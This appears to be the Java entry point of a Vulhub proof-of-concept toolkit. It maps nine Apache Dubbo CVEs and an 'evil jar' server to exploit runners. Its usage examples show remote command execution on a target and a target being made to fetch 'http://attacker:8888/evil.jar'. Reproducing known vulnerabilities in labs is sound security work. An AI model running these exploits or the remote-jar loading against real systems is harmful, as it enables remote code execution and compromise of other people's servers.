package org.vulhub.poc;

import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;

public class DubboPoc {
    private interface Runner {
        void run(String[] args) throws Exception;
    }

    private static final Map<String, Runner> RUNNERS = new LinkedHashMap<>();

    static {
        register("CVE-2019-17564", CVE201917564::main);
        register("CVE-2020-1948", CVE20201948::main);
        register("CVE-2021-25641", CVE202125641::main);
        register("CVE-2021-30179", CVE202130179::main);
        register("CVE-2021-32824", CVE202132824::main);
        register("CVE-2021-36162", PublishMigrationRule::main);
        register("CVE-2021-43297", CVE202143297::main);
        register("CVE-2022-39198", CVE202239198::main);
        register("CVE-2023-23638", CVE202323638::main);
        register("SERVE-EVIL-JAR", EvilServer::main);
    }

    public static void main(String[] args) throws Exception {
        if (args.length == 0 || "--help".equals(args[0]) || "-h".equals(args[0])) {
            usage();
            return;
        }

        Runner runner = RUNNERS.get(normalize(args[0]));
        if (runner == null) {
            System.err.println("Unsupported Dubbo PoC: " + args[0]);
            usage();
            System.exit(1);
        }

        runner.run(Arrays.copyOfRange(args, 1, args.length));
    }

    private static void register(String name, Runner runner) {
        RUNNERS.put(normalize(name), runner);
        RUNNERS.put(normalize(name.replace("-", "")), runner);
    }

    private static String normalize(String value) {
        return value.toUpperCase(Locale.ROOT).replace("_", "-");
    }

    private static void usage() {
        System.err.println("Usage: java -jar dubbo-poc-1.0-SNAPSHOT.jar <cve> <host> <port> [command]");
        System.err.println();
        System.err.println("Examples:");
        System.err.println("  java -jar dubbo-poc-1.0-SNAPSHOT.jar CVE-2020-1948 127.0.0.1 20880 \"touch /tmp/success\"");
        System.err.println("  java -jar dubbo-poc-1.0-SNAPSHOT.jar CVE-2021-25641 127.0.0.1 20880 kryo");
        System.err.println("  java -jar dubbo-poc-1.0-SNAPSHOT.jar CVE-2021-36162 zookeeper:2181 http://attacker:8888/evil.jar");
        System.err.println("  java -jar dubbo-poc-1.0-SNAPSHOT.jar serve-evil-jar 8888");
    }
}
